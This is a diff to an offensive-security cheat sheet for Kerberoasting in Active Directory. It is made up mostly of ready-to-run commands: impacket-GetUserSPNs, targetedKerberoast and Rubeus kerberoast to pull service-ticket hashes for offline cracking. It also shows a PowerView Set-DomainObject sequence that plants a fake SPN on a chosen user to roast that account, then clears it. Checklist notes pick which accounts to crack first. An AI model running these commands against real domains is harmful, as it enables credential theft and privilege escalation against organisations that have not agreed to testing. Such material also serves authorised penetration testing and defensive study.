@@ -6,6 +6,7 @@ sudo ntpdate <DCIP>
 - [ ] Any domain credential will do: a password, or an NT hash with -hashes
 
 ## Find the roastable accounts
+At the pwn-broker prompt: tool install impacket and tool install netexec.
 impacket-GetUserSPNs '<Domain>/<Username>:<Password>' -dc-ip <DCIP>
 - [ ] MemberOf: a service account in an admin group is the one to crack first
 - [ ] PasswordLastSet years ago: a weak password, set by hand and never changed
@@ -29,11 +30,17 @@ targetedKerberoast -d <Domain> -u '<Username>' -p '<Password>' --dc-ip <DCIP> --
 - [ ] Shadow credentials give the hash with no cracking at all: :Pb acl-abuse
 
 ## From a Windows shell
-Rubeus.exe from my own tools, into upload/ for serve. /nowrap keeps each hash on one line.
+At the pwn-broker prompt:
+tool install rubeus
+serve
+serve files rubeus
+On the Windows host:
+- [ ] Rubeus.exe fetched with the line serve files gives
+/nowrap keeps each hash on one line.
 .\Rubeus.exe kerberoast /stats
 .\Rubeus.exe kerberoast /outfile:kerberoast.txt /nowrap
 .\Rubeus.exe kerberoast /user:<TargetUser> /outfile:kerberoast.txt /nowrap
-Targeted, with PowerView loaded:
+Targeted, with PowerView loaded as in :Pb domain-enum:
 Set-DomainObject -Identity '<TargetUser>' -Set @{serviceprincipalname='cifs/pwn'}
 .\Rubeus.exe kerberoast /user:<TargetUser> /outfile:targeted.txt /nowrap
 Set-DomainObject -Identity '<TargetUser>' -Clear serviceprincipalname
